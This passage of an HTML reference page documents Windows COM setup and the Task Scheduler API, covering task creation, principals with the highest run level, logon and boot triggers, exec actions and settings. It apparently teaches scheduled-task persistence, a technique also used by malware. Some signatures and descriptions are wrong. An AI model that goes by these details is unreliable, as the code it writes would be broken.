+<p>A <strong>thread</strong> is an execution unit, while an <strong>apartment</strong> is a way of managing how threads interact with COM objects. The two main types of apartment are <strong>Single-Threaded Apartments</strong> (STAs) and <strong>Multi-Threaded Apartments</strong> (MTAs).</p>
+</div>
+</div>
+<ul>
+<li>
+<p><code>FAILED</code>: A macro defined in the Windows SDK that is used to check the return value of any Windows function that uses the <code>HRESULT</code> or <code>SCODE</code> data type. Its purpose is to determine if a call to a COM function resulted in an error. It is defined in <code>winerror.h</code>.</p>
+<pre><code class="language-C">#define FAILED(hr)(((HRESULT)(hr)) &lt; 0)
+</code></pre>
+<p>Here is a breakdown of the <code>FAILED</code> macro's parameters:</p>
+<ul>
+<li><code>hr</code>: The <code>HRESULT</code> value returned by a Windows API or COM method call.
+The result yielded from the <code>FAILED</code> macro is a BOOLEAN, <code>TRUE</code> if a failure occurred, <code>FALSE</code> otherwise.</li>
+</ul>
+</li>
+<li>
+<p><code>goto</code>: A <code>C</code> control flow statement that performs an unconditional jump from one part of a function to another labeled statement within the same function.</p>
+<ul>
+<li>It is made up of two parts:
+<ol>
+<li><strong>The <code>goto</code> statement</strong>: The instruction that causes the jump, followed by the name of the label (i.e., <code>goto &lt;label_name&gt;</code>).</li>
+<li><strong>The Label</strong>: A marker that identifies the destination of the jump. It is simply an identifier followed by a colon (i.e., <code>label_name: &lt;statement&gt;;</code>)
+It is typically used to simplify complex resource management and error handling, especially when dealing with multiple points of failure that all require the same exit logic.</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><code>CoInitializeSecurity</code>: A fundamental Windows API function used in COM programming to establish the security settings for a thread or an entire process that uses COM objects. It must be called before creating COM objects, registering interfaces, or using any COM features that involve cross-process or remote communication channels, which require an established security policy.</p>
+<ul>
+<li>It establishes default security values for:
+<ul>
+<li><code>Authentication</code>: Who can talk to the process</li>
+<li><code>Authorization</code>: What permissions they have</li>
+<li><code>Impersonation</code>: How the server handles the client's identity</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-C">HRESULT CoInitializeSecurity(
+    [in, optional] PSECURITY_DESCRIPTOR pSecDesc,
+    [in] LONG cAuthSvc,
+    [in, optional] PEfenseInfo pAuthSvc,
+    [in, optional] void *pReserved1,
+    [in] DWORD dwAuthnLevel,
+    [in] DWORD dwImpLevel,
+    [in, optional] void *pAuthList,
+    [in] DWORD dwCapabilities,
+    [in, optional] void *pReserved3
+);
+</code></pre>
+<p>Here is a breakdown of the <code>CoInitializeSecurity</code> function's parameters:</p>
+<ul>
+<li><code>pSecDesc</code>: A pointer to the security descriptor. If this is <code>NULL</code>, COM constructs a default security descriptor based on the other parameters and machine settings.</li>
+<li><code>cAuthSvc</code>: The count of entries in the <code>pAuthSvc</code> parameter. If set to <code>-1</code>, COM chooses which authentication services to register.</li>
+<li><code>pAuthSvc</code>: An array of authentication service information structures. Typically set to <code>NULL</code> when <code>cAuthSvc</code> is set to <code>-1</code>.</li>
+<li><code>pReserved1</code>: Reserved. Set to <code>NULL</code>.</li>
+<li><code>dwAuthnLevel</code>: The default authentication level for the process. This is the degree to which the server proves its identity:
+<ul>
+<li><code>RPC_C_AUTHN_LEVEL_NONE</code>: No authentication. The identity of the client is not checked. Only used for local, non-sensitive communication where performance is critical.</li>
+<li><code>RPC_C_AUTHN_LEVEL_CONNECT</code>: Authentication only occurs when the client first establishes a connection with the server. Provides basic security without overhead on every call.</li>
+<li><code>RPC_C_AUTHN_LEVEL_CALL</code>: Authentication occurs at the beginning of every call. Ensure client identity is valid for the duration of the call.</li>
+<li><code>RPC_C_AUTHN_LEVEL_PKT</code>: Ensures all data packets send by the client contain a digital signature to verify the data's integrity and client's identity. Good for protecting against basic data tampering.</li>
+<li><code>RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</code>: Ensures that all data is signed and the entire message has not been modified in transit.</li>
+<li><code>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</code>: Provides the highest level of security. Includes packet integrity and also encrypts the argument values for every remote procedure call. Recommended for secure applications where data confidentiality is required.</li>
+</ul>
+</li>
+<li><code>dwImpLevel</code>: The default impersonation level for proxies. Defines how much authority the client grants to the server to act on its behalf.
+<ul>
+<li><code>RPC_C_IMP_LEVEL_ANONYMOUS</code>: The client is anonymous to the server. The server cannot access any client specific information.</li>
+<li><code>RPC_C_IMP_LEVEL_IDENTITY</code>: The server can obtain the client's identity and query the client's privileges but cannot impersonate the client to access resources.</li>
+<li><code>RPC_C_IMP_LEVEL_IMPERSONATE</code>: The server can act on the client's behalf to access local resources on the same computer, only if the client has been granted permission.</li>
+<li><code>RPC_C_IMP_LEVEL_DELEGATE</code>: The highest level. The server can act on the client's behalf to access resources on a remote computer. Requires Kerberos delegation.</li>
+</ul>
+</li>
+<li><code>pAuthList</code>: A pointer to a list of client and server identities. Often set to <code>NULL</code>.</li>
+<li><code>dwCapabilities</code>: A set of flags to indicate the capabilities of the client or server, primarily related to marshaling (passing interfaces between apartments or processes) and synchronization.
+<ul>
+<li><code>EOAC_NONE</code>: The default. No specific capabilities are set</li>
+<li><code>EOAC_MUTUAL_AUTH</code>: Requires both the client and server to authenticate each other, ensuring two-way trust in secure applications.</li>
+<li><code>EOAC_STATIC_CLOAKING</code>: Uses the client's process token when communicating with the server. Bypasses the need for explicit delegation checks in some cases.</li>
+<li><code>EOAC_DYNAMIC_CLOAKING</code>: Uses the client's most recent security context when communicating. More secure than static, as it adapts to token changes.</li>
+<li><code>EOAC_NO_CUSTOM_MARSHAL</code>: Prevents the use of custom marshaling, which can sometimes be exploited. Enhances security by limiting object transport mechanisms.</li>
+</ul>
+</li>
+<li><code>pReserved3</code>: Reserved. Set to <code>NULL</code>.</li>
+</ul>
+<p><code>CoInitializeSecurity</code> returns an <code>HRESULT</code> (<code>S_OK</code> for Success)</p>
+</li>
+<li>
+<p><code>CoCreateInstance</code>: A fundamental Windows API function used in COM programming for creating an instance of a COM object and initializing it to interact with it via it's methods.</p>
+<pre><code class="language-C">HRESULT CoCreateInstance(
+    [in] REFCLSID rclsid,
+    [in, optional] LPUNKNOWN pUnkOuter,
+    [in] DWORD dwClsContext,
+    [in] REFIID riid,
+    [out] LPVOID *ppv
+);
+</code></pre>
+<p>Here is a breakdown of the <code>CoCreateInstance</code> function's parameters:</p>
+<ul>
+<li><code>rclsid</code>: The Class ID (<code>CLSID</code>) of the object you want to create (i.e., <code>CLSID_TaskScheduler</code>, <code>CLSID_RecycleBin</code>, <code>CLSID_Run</code>)</li>
+<li><code>pUnkOuter</code>: Used for aggregation. Must be set to <code>NULL</code> unless you are creating an aggregated object.</li>
+<li><code>dwClsCntext</code>: The execution context in which the object is to be run. Specifies whether the component is in-process (DLL), local executable, or remote.</li>
+<li><code>riid</code>: The Interface ID of the interface you want to retrieve a pointer to (i.e., <code>IID_ITask_Service</code>, <code>IID_ITaskFolder</code>, <code>IID_IRegisteredTask</code>)
+<ul>
+<li><code>CLSCTX_INPROC_SERVER</code>: The object is implemented in a DLL and runs in the same process as the caller.</li>
+<li><code>CLSCTX_LOCAL_SERVER</code>: The object is implemented in an EXE and runs as a separate process on the local machine.</li>
+<li><code>CLSCTX_REMOTE_SERVER</code>: The object is implemented on a separate machine.</li>
+<li><code>CLSCTX_ALL</code>: Checks all installed contexts (in-process, local, remote). General purpose usage.</li>
+</ul>
+</li>
+<li><code>ppv</code>: The address of a pointer variable that receives the requested interface pointer (<code>riid</code>). If the function succeeds, this pointer is the entry point for interacting with the object. If it fails, the value is set to <code>NULL</code>.</li>
+</ul>
+<p><code>CoCreateInstance</code> returns an <code>HRESULT</code> value, indicating success or failure. Use the <code>FAILED()</code> macro to check this result.</p>
+</li>
+<li>
+<p><code>ITaskService</code>: A COM Interface that acts as the primary gateway to the Windows Task Scheduler service. Its methods provide the necessary functionality to connect to and manage the task hierarchy, as well as the ability to create new task definitions.</p>
+<ul>
+<li>
+<p><code>Connect</code>: Connects to the Task Scheduler service on the local machine or a remote machine. Typically the first method called after creating the <code>ITaskService</code> object.</p>
+<pre><code class="language-C">HRESULT ITaskService::Connect(
+  [in, optional] VARIANT serverName,
+  [in, optional] VARIANT user,
+  [in, optional] VARIANT domain,
+  [in, optional] VARIANT password
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>Connect</code> method's parameters:</p>
+<ul>
+<li><code>serverName</code>: The name of the computer to connect to. If left empty, it defeaults to the local computer.</li>
+<li><code>user</code>: The user name to use for connecting to the service. If empty, it defaults to the current user's credentials.</li>
+<li><code>domain</code>: The domain or workgroup of the user account. If left empty, the credentials apply to the local machine or default domain.</li>
+<li><code>password</code>: The password for the specified user. Must be provided if <code>user</code> is provided. If left empty, the current user's password is used.</li>
+</ul>
+</li>
+<li>
+<p><code>Connect</code> returns an <code>HRESULT</code> value. The <code>S_OK</code> value indicates success.</p>
+</li>
+</ul>
+<blockquote>
+<p><code>VARIANT</code> is a special structure used in COM programming, OLE Automation, and scripting languages, which is designed to hold the data of almost any type, providing a standard way to pass data between COM components where the exact data type is not known until runtime.</p>
+</blockquote>
+</li>
+<li>
+<p><code>GetFolder</code>: A crucuial function in the Windows Task Scheduler API used to navigate and access the folder hierarchy where scheduled tasks are stored, enabling subsequent operations like querying, creating, deleting, or retrieving existing tasks within that folder.</p>
+<pre><code class="language-C">HRESULT ITaskService::GetFolder(
+  [in] BSTR path,
+  [out] ITaskFolder **ppFolder
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>GetFolder</code> method's parameters:</p>
+<ul>
+<li><code>path</code>: The path to the task folder ou want to access. This must be a <code>BSTR</code>. For the root folder, the path is <code>L"\\"</code>.</li>
+<li><code>ppFolder</code>: The address of a pointer variable that receives the <code>ITaskFolder</code> interface pointer for the requrested folder. This is the output pointer you use for subsequent task management.</li>
+</ul>
+</li>
+<li>
+<p>The <code>GetFolder</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the folder was successfully retrieved and the <code>ppFolder</code> pointer is valid.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>NewTask</code>: An important method in the Windows Task Scheduler API that is used to create a new, empty task definition object. It is crucial for retrieving a pointer to the <code>ITaskDefinition</code> interface, which represents a blank template for a scheduled task and is where the task's properties are configured.</p>
+<pre><code class="language-C">HRESULT ITaskService::NewTask(
+  [in] DWORD flags,
+  [out] ITaskDefinition **ppDefinition
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>NewTask</code> method's parameters:</p>
+<ul>
+<li><code>flags</code>: Reserved for future use. Must be set to <code>0</code>.</li>
+<li><code>ppDefinition</code>: The address of a pointer variable that receives the <code>ITaskDefinition</code> interface pointer. This is the output pointer to the newly created blank task template.</li>
+</ul>
+</li>
+<li>
+<p>The <code>NewTask</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates a new task definition object was successfully created and the <code>ppDefinition</code> pointer is valid.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>Release</code>: A method from the foundational <code>IUnknown</code> COM interface, used to decrement the reference count of a given COM object. It takes no parameters, It only exists to free the memory associated with a COM object, preventing memory leaks.</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>
+<p><code>ITaskFolder</code>: A COM interface, which is part of the Windows Task Scheduler API and represents a container or directory within the Task Scheduler's hierarchical structure, allowing a program to manage and interact with tasks stored in a specific location. It provides methods necessary for Task Creation, Task Deletion, Task Querying, and SubFolder management.</p>
+<ul>
+<li>
+<p><code>DeleteTask</code>: Permanently removes a scheduled task from a specific folder within the Windows Task Scheduler.</p>
+<pre><code class="language-C">HRESULT ITaskFolder::DeleteTask(
+  [in] BSTR name,
+  [in] long flags
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>DeleteTask</code> method's parameters:</p>
+<ul>
+<li><code>name</code>: The name of the task to be deleted.</li>
+<li><code>flags</code>: Reserved. Set to <code>0</code>.</li>
+</ul>
+</li>
+<li>
+<p>The <code>DeleteTask</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the task was deleted successfully.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>RegisterTaskDefinition</code>: A method within the Windows Task Scheduler API which takes a fully defined task object and registers it with the Windows Task Scheduler services making it active and persistent. It is the final and most critical step in creating or updating a scheduled task. It instructs the Task Scheduler to check the structure and contents of the Task definition, create and sae the task's XML definition file in the appropriate system directory (<code>C:\Windows\System32\Tasks\</code>), and update the service's internal registry and in-memory schedule so the task can be executed when its triggers are met.</p>
+<pre><code class="language-C">HRESULT ITaskFolder::RegisterTaskDefinition(
+  [in] BSTR path,
+  [in] ITaskDefinition *pDefinition,
+  [in] LONG flags,
+  [in] VARIANT userId,
+  [in] VARIANT password,
+  [in] TASK_LOGON_TYPE logonType,
+  [in] VARIANT sddl,
+  [out] IRegisteredTask **pTask
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>RegisterTaskDefinition</code> method's parameters:</p>
+<ul>
+<li><code>path</code>: The name to assign to the new task.</li>
+<li><code>pDefinition</code>: A pointer to the fully configured task definition object created via <code>ITaskService::NewTask()</code>.</li>
+<li><code>flags</code>: Flags that define how the task is registered.
+<ul>
+<li><code>TASK_REGISTRATION_CREATE_NEW</code>: Creates the task only if one with the same name doesn't exist.</li>
+<li><code>TASK_REGISTRATION_UPDATE</code>: Updates an existing task with the new definition.</li>
+<li><code>TASK_CREATE_OR_UPDATE</code>: If the task exits, it updates it. Otherwise it creates a new one.</li>
+</ul>
+</li>
+<li><code>userId</code>: The user account name under which the task is registered and will run. Often passed as an empty <code>VARIANT</code> to use the current user's security context.</li>
+<li><code>password</code>: The password for the user account specified in <code>userId</code>. Often passed as an empty <code>VARIANT</code>.</li>
+<li><code>logonType</code>: Specifies the security context required to run the task.
+<ul>
+<li><code>TASK_LOGON_NONE</code>: The task runs with the least privileges. No credentials are explicitly required to be registered with the task. Used for non-interactive tasks where no specific user identity is required.</li>
+<li><code>TASK_LOGON_S4U</code>: Services for user. The task runs under a specified user account but the user does not have to be logged on.</li>
+<li><code>TASK_LOGON_INTERACTIVE_TOKEN</code>: The task runs using a token that is valid only if the user specified in the task is currently logged on. Ensures a task runs only when a user session is active.</li>
+<li><code>TASK_LOGON_GROUP</code>: The task runs with the credentials of a user or a group of users specified in the task definition. Allows the task to run if any member of the specified group logs on.</li>
+<li><code>TASK_LOGON_SERVICE_ACCOUNT</code>: The task runs as a service account that is already registered on the machine. Used for highly privileged background system processes that do not need a desktop session.</li>
+<li><code>TASK_LOGON_PASSWORD</code>: The task runs using a specific user account and password that must be supplied and stored by the Task SCheduler. Used for running under specific accounts, often when the user is not logged on.</li>
+</ul>
+</li>
+<li><code>sddl</code>: Security Descriptor Definition Language string, which explicitly sets the permissions for the task. It is optional and typically passed as an empty <code>VARIANT</code>.</li>
+<li><code>ppTask</code>: An output pointer that receives an <code>IRegisteredTask</code> interface, representing the active, newly registered task. This pointer must be released before the program exits to prevent memory leaks.</li>
+</ul>
+</li>
+<li>
+<p>The <code>RegisterTaskDefinition</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the task was successfully registered.</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>
+<p><code>ITaskDefinition</code>: A COM interface, which acts as the blueprint/template for a scheduled task in the Windows Task SCheduler API. It is the object which defines what a task does and when it does it. It provides methods for Task Triggers, Task Actions, Task Security Context, Task behaviors and more.</p>
+<ul>
+<li>
+<p><code>get_Principal</code>: A critical method in the Task Scheduler API used to retrieve the interface that defines the security context under which a task will run.</p>
+<pre><code class="language-C">HRESULT ITaskDefinition::get_Principal(
+  [out] IPrincipal **ppPrincipal
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>get_Principal</code> method's parameters: -<code>ppPrincipal</code>: The address of a pointer variable that will receive the IPrincipal interface pointer. This is the output pointer used to configure the tasks security context.</li>
+<li>The <code>get_Principal</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the <code>IPrincipal</code> object was successfully created and the <code>ppPrincipal</code> pointer is valid.</li>
+</ul>
+<div id="admonition-note-7" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-7-title">
+<div class="admonition-title">
+<div id="admonition-note-7-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-7"></a>
+</div>
+<div>
+<p>The caller is responsible for calling <code>Release()</code> on the resulting <code>IPrincipal</code> pointer when finished to prevent memory leaks.</p>
+</div>
+</div>
+</li>
+<li>
+<p><code>get_Triggers</code>: A fundamental method in the Task Scheduler API used to retrieve the collection interface that defines when a task will be executed. It is responsible for retrieving a pointer to the <code>ITriggerCollection</code> COM interface, which adds individual triggers to the task definition.</p>
+<pre><code class="language-C">HRESULT ITaskDefinition::get_Triggers(
+  [out] ITriggerCollection **ppTriggers
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>get_Triggers</code> method's parameters:
+<ul>
+<li><code>ppTriggers</code>: The address of a pointer variable that will receive the <code>ITriggerCollection</code> interface pointer. This is the output pointer used to manage the task's triggers.</li>
+</ul>
+</li>
+<li>The <code>get_Triggers</code> method returns an <code>HRESULT</code>. <code>S_OK</code> indicates the <code>ITriggerCollection</code> object was successfully created/retrieved and the <code>ppTriggers</code> pointer is valid. Must use <code>Release()</code> when finished.</li>
+</ul>
+</li>
+<li>
+<p><code>get_Actions</code>: A fundamental method in the Task Scheduler API used to retrieve a pointer to the collection interface that defines what a task will execute when it is triggered.</p>
+<pre><code class="language-C">HRESULT ITaskDefinition::get_Actions(
+  [out] IActionCollection **ppActions
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>get_Actions</code> parameters:
+<ul>
+<li><code>ppActions</code>: The address of a pointer variable that will receive the <code>IActionCollection</code> interface pointer. This is the output pointer used to manage the task's actions.</li>
+</ul>
+</li>
+<li>The <code>get_Actions</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the <code>IActionCollection</code> object was successfully created/retrieved and the <code>ppActions</code> pointer is valid. You must use <code>Release()</code> when finished.</li>
+</ul>
+</li>
+<li>
+<p><code>get_Settings</code>: A fundamental method in the Task Scheduler API used to retrieve a pointer to the <code>ITaskSettings</code> COM interface.</p>
+<pre><code class="language-C">HRESULT ITaskDefinition::get_Settings(
+  [out] ITaskSettings::get_Settings **ppSettings
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>get_Settings</code> method's parameters:
+<ul>
+<li><code>ppSettings</code>: The address of a pointer variable that will receive the <code>ITaskSettings</code> interface pointer. This is the output pointer used to configure the task's operational behavior.</li>
+</ul>
+</li>
+<li>The <code>get_Settings</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the <code>ITaskSettings</code> object was successfully created/retrieved and the <code>ppSettings</code> pointer is valid. Must use <code>Release()</code> when finished.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>IPrincipal</code>: A component of the Windows Task Scheduler API dedicated entirely to defining the security and identity under which a scheduled task will execute. It is primarily responsible for specifying the user account and privilege level for the task, which dictates its abilities and limitations on the system. It contains methods for managing user identity, privilege level, logon type, and process security.</p>
+<ul>
+<li>
+<p><code>put_LogonType</code>: A property setter in the Task Scheduler API used to define the executino requirement or the type of security token the task needs to run. It sets the condition under which the Task Scheduler service will allow the task's action to execute after its trigger has fired.</p>
+<pre><code class="language-C">HRESULT IPrincipal::put_LogonType(
+  [in] TASK_LOGON_TYPE logonType
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>put_LogonType</code> method's parameters:</p>
+<ul>
+<li><code>put_LogonType</code>: A value from the enumeration that specifies the required security context for the task to run.</li>
+</ul>
+<div id="admonition-note-8" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-8-title">
+<div class="admonition-title">
+<div id="admonition-note-8-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-8"></a>
+</div>
+<div>
+<p>See <code>RegisterTaskDefinition</code> to see what values can be passed to <code>put_LogonType</code>.</p>
+</div>
+</div>
+</li>
+<li>
+<p>The <code>put_LogonType</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the logon type was successfully set on the <code>IPrincipal</code> object.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>put_RunLevel</code>: A property setter used to set the security run level for the task's process token. It dictates whether the task will execute with standard user privileges or with elevated administratiev privileges.</p>
+<pre><code class="language-C">HRESULT IPrincipal::put_RunLevel(
+  [in] TASK_RUNLEVEL_TYPE runLevel
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>put_RunLevel</code> method's parameters:
+<ul>
+<li><code>runLevel</code>: A value from the enumeration that specifies the privilege level the task should run at.
+<ul>
+<li><code>TASK_RUNLEVEL_LUA</code>: Least-privilege User Account. The task will run with the standard, filtered token for a normal user.</li>
+<li><code>TASK_RUNLEVEL_HIGHEST</code>: The task runs with the highest privileges available to the specified user.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>The <code>put_RunLevel</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the run level was successfully set on the <code>IPrincipal</code> object.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>ITriggerCollection</code>: A vital component of the Windows Task Scheduler API, which acts as a container or array for all the specific triggers that define when a scheduled task will start. It is responsible for creating, deleting and configuring new trigger objects.</p>
+<ul>
+<li><code>Create</code>: The primary method used to instantiate a new trigger object within the Task Scheduler API, which is then configured to define a specific start condition for a scheduled task.
+<pre><code class="language-C">HRESULT ITriggerCollection::Create(
+  [in] TASK_TRIGGER_TYPE2 type,
+  [out] ITrigger **ppTrigger
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>Create</code> method's parameters:
+<ul>
+<li><code>type</code>: A value from the enumeration that specifies the type of trigger to create.
+<ul>
+<li><code>TASK_TRIGGER_LOGON</code>: Triggers when a specified user logs on.</li>
+<li><code>TASK_TRIGGER_DAILY</code>: Triggers at a specific time daily or every few days.</li>
+<li><code>TASK_TRIGGER_TIME</code>: Triggers once at a specific date and time.</li>
+<li><code>TASK_TRIGGER_EVENT</code>: Triggers when a specific event is written to the Windows Event Log.</li>
+<li><code>TASK_TRIGGER_BOOT</code>: Triggers when the system starts up.</li>
+</ul>
+</li>
+<li><code>ppTrigger</code>: The address of a pointer variable that receives the <code>ITrigger</code> interface pointer for the newly created trigger object.</li>
+</ul>
+</li>
+<li>The <code>Create</code> returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the trigger object was successfully created and the <code>ppTrigger</code> pointer is valid.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>ITrigger</code>: The generic, base interface for all specific types of triggers within the Windows Task Scheduler API. It defines the common properties and methods shared by every condition that can initiate a scheduled task, such as the trigger type, id, enabled state, start and end boundary.</p>
+<ul>
+<li>
+<p><code>QueryInterface</code>: A foundational method inherited from the <code>IUnknown</code> base interface, making it essential for all COM objets. It is used to safely navigate between different interfaces supported by a single COM object.</p>
+<pre><code class="language-C">HRESULT IUnknown::QueryInterface(
+  [in] REFIID riid,
+  [out] void **ppvObject
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>QueryInterface</code> method's parameters:
+<ul>
+<li><code>riid</code>: The Interface ID of the interface being requested
+<ul>
+<li><code>IID_ILogonTrigger</code>: Configures properties unique to a logon event.</li>
+<li><code>IID_IDailyTrigger</code>: Configures tasks that run every day or every <code>N</code> days, including the specific time of day for execution.</li>
+<li><code>IID_IEventTrigger</code>: Configures tasks that start when a specific Windows Event Log event occurs.</li>
+<li><code>IID_IBootTrigger</code>: Configures tasks that run when the system boots up.</li>
+</ul>
+</li>
+<li><code>ppvObject</code>: The address of the pointer variable that will receive the pointer to the requested interface. Typically gets typecasted.</li>
+</ul>
+</li>
+<li>The <code>QueryInterface</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the object supports the interface and <code>ppvObject</code> is valid. <code>E_NOINTERFACE</code> indicates the object does not support the requested interface.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>IActionCollection</code>: A vital component of the Windows Task Scheduler APi, which acts as a container or array for all the specific actions that a scheduled task is configured to execute. It is primarily used to manage the various commands or programs that run when a task's trigger fires. A single task can have multiple actions. <code>IActionCollection</code> contains methods for creating actions and managing the collection's entries.</p>
+<ul>
+<li><code>Create</code>: The primary method used to instantiate a new action object within the Task Scheduler API, which is then configured to define a specific command or program that a scheduled task will execute.
+<pre><code class="language-C">HRESULT IActionCollection::Create(
+  [in] TASK_ACTION_TYPE type;
+  [out] IAction **ppAction
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>Create</code> method's parameters:
+<ul>
+<li><code>type</code>: A value from the enumeration that specifies the type of action to create.
+<ul>
+<li><code>TASK_ACTION_EXEC</code>: Run a command line program or script.</li>
+<li><code>TASK_ACTION_COM_HANDLER</code>: Execute a method no a registered COM handler object.</li>
+</ul>
+</li>
+<li><code>ppAction</code>: A vital component of the Windows Task Scheduler API used to add a new action (i.e., "run a program", "send an email", "display a message") to a scheduled task.</li>
+</ul>
+</li>
+<li>The <code>Create</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the action object was successfully created and the <code>ppAction</code> pointer is valid.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>IAction</code>: The generic, base interface for all specific types of actions within the Windows Task Scheduler API. It defines the common properties and methods shared by every command or program that a scheduled task can execute, such as the Action Type and ID.</p>
+<ul>
+<li>** QueryInterface Interface IDs**:
+<ul>
+<li><code>IID_IExecAction</code>: Configures an action that runs an executable or command line script</li>
+<li><code>IID_IComHandlerAction</code>: Configures an action that executes a method on a registered COM object.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>IExecAction</code>: The component within the Windows Task Scheduler API used to define an action that runs a command line program, script, or executable file. It configures the exact command and environment for an executable action and defines methods for setting the executable path, arguments, and working directory.</p>
+<ul>
+<li>
+<p><code>put_Path</code>: A property setter in the Task Scheduler API used to define the full path to the executable or script file that a scheduled task will launch when its action is executed.</p>
+<pre><code class="language-C">HRESULT IExecAction::put_Path(
+  [in] BSTR path
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the method's parameters:
+<ul>
+<li><code>path</code>: The full, absolute path to the executable file that the task should execute.</li>
+</ul>
+</li>
+<li>The <code>put_Path</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the path was successfully set on the <code>IExecAction</code> object.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>ITaskSettings</code>: A component of the Windows Task Scheduler API used to define the operational behavior, constraints, and execution environment of a scheduled task. It is used to control how the Task Scheduler service manages and executes the task, rather than when or what. It allows for fine-tuning the task's execution policy. It defines methods for configuring execution limits and controls, power and role conditions, visibility and priority, and wake-up behavior.</p>
+<ul>
+<li>
+<p><code>put_ExecutionTimeLimit</code>: A property setter in the Task Scheduler API used to defie the maximum amount of time a scheduled task is allowed to run before the Task Scheduler service forcibly terminates the task's process.</p>
+<ul>
+<li>The format (<a href="https://www.iso.org/iso-8601-date-and-time-format.html">ISO 8601</a>) starts with <code>P</code> (for Period) followed by one or more time components:
+<ul>
+<li><code>Y</code> (Years) -&gt; i.e., <code>P2Y</code> is a period of 2 years.</li>
+<li>M (Months)</li>
+<li>W (Weeks)</li>
+<li>D (Days)</li>
+<li>T (Time Separator required before hours/minutes/seconds)</li>
+<li>H (Hours)</li>
+<li>M (Minutes)</li>
+<li>S (Seconds)</li>
+</ul>
+</li>
+<li>Passing an empty string <code>L""</code> or <code>0</code> implies no time limit.</li>
+</ul>
+<pre><code class="language-C">HRESULT ITaskSettings::put_ExecutionTimeLimit(
+  [in] BSTR timeLimit
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>put_ExecutionTimeLimit</code> method's parameters:</p>
+<ul>
+<li><code>timeLimit</code>: A BSTR containing the execution time limit in the ISO 8601 duration format (i.e., <code>P2M2WT2H</code> for 2 months, 2 weeks, and 2 hours).</li>
+</ul>
+</li>
+<li>
+<p>The <code>put_ExecutionTimeLimit</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the time limit was successfully set on the <code>ITaskSettings</code> object.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>put_AllowDemandStart</code>: A property setter in the Task Scheduler API used to control whether a scheduled task can be manually started outside of its defined triggers. Setting <code>allowDemandStart</code> to <code>FALSE</code> is used in security-sensitive or high-availability environments to ensure that tasks only run under specific controlled conditions and are not accidentally or maliciously executed by unauthorized processes on demand.</p>
+<pre><code class="language-C">HRESULT ITaskSettings::put_AllowDemandStart(
+  [in] VARIANT_BOOL allowDemandStart
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>put_AllowDemandStart</code> method's parameters:
+<ul>
+<li><code>allowDemandStart</code>: A boolean value that specifies whether manual execution is allowed. The value should be set to <code>VARIANT_TRUE</code> or <code>VARIANT_FALSE</code>.</li>
+</ul>
+</li>
+<li>The <code>put_AllowDemandStart</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</li>
+</ul>
+</li>
+<li>
+<p><code>put_StartWhenAvailable</code>: A property setter in the Task Scheduler API that defines the task's behavior if its scheduled start time is missed. Used to instruct the Task Scheduler to run the task even if its initial trigger has passed, provided the trigger condition is no longer valid.</p>
+<pre><code class="language-C">HRESULT ITaskSettings::put_StartWhenAvailable(
+  [in] VARIANT_BOOL startWhenAvailable
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>put_StartWhenAvailable</code> method's parameters:
+<ul>
